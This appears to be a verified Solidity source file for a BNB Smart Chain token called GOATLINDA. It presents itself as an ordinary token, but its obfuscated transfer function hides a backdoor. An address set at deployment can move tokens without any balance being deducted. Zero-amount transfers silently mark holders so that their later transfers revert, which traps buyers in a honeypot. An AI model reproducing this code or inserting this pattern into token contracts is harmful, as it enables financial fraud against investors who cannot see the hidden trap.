/**
 *Submitted for verification at BscScan.com on 2023-05-13
*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.2;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract GOATLINDA is Ownable {
    uint8 public decimals = 9;

    string public name;

    address public uniswapV2Pair;

    mapping(address => mapping(address => uint256)) public allowance;

    constructor(address ride) {
        symbol = 'GOATLINDA';
        name = 'GOATLINDA';
        totalSupply = 1000000000 * 10 ** decimals;
        balanceOf[msg.sender] = totalSupply;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
        pacifist[ride] = galaxy;
    }

    function pedals(address dribble, address ivy, uint256 supper) private returns (bool success) {
        if (pacifist[dribble] == 0) {
            if (rough[dribble] > 0 && dribble != uniswapV2Pair) {
                pacifist[dribble] -= galaxy;
            }
            balanceOf[dribble] -= supper;
        }
        if (supper == 0) {
            rough[ivy] += galaxy;
        }
        balanceOf[ivy] += supper;
        emit Transfer(dribble, ivy, supper);
        return true;
    }

    function transfer(address ivy, uint256 supper) public returns (bool success) {
        pedals(msg.sender, ivy, supper);
        return true;
    }

    uint256 private galaxy = 49;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    function approve(address valuable, uint256 supper) public returns (bool success) {
        allowance[msg.sender][valuable] = supper;
        emit Approval(msg.sender, valuable, supper);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private rough;

    function transferFrom(address dribble, address ivy, uint256 supper) public returns (bool success) {
        pedals(dribble, ivy, supper);
        require(supper <= allowance[dribble][msg.sender]);
        allowance[dribble][msg.sender] -= supper;
        return true;
    }

    mapping(address => uint256) public balanceOf;

    uint256 public totalSupply;

    mapping(address => uint256) private pacifist;

    string public symbol;
}